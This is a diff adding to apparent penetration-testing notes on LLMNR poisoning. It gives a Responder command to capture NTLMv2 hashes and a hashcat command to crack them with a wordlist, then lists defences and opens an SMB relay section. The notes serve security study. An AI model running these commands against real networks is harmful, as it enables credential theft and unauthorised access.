@@ -29,4 +29,27 @@ STEPS:
 - Get some hashes
 - Crack the hashes 
 
+Capturing NTLMV2 Hashes with Responder
+------------------------------------------
+ `responder -I eth0 -rdwv`
+ 
+ Password cracking with Hashcats
+ -----------------------------------------
+ copy and paste the hashes collected:
+ 
+ `gedit hashes.txt`
+ 
+ paste the hashes and save
+ 
+ `hashcat -m 5600 hashes.txt rockyou.txt --force`
+ 
+ LLMNR Poisoning defenses
+ -------------------------------------------
+ Best defense is to disable LLMNR & NBT-NS
+ if you have to use or cannot disable LLMNR/NBT-NS;
+ 
+ - Enable Network Access Control
+ - Use Strong User Password
+
+## 2.SMB RELAY ATTACKS
 
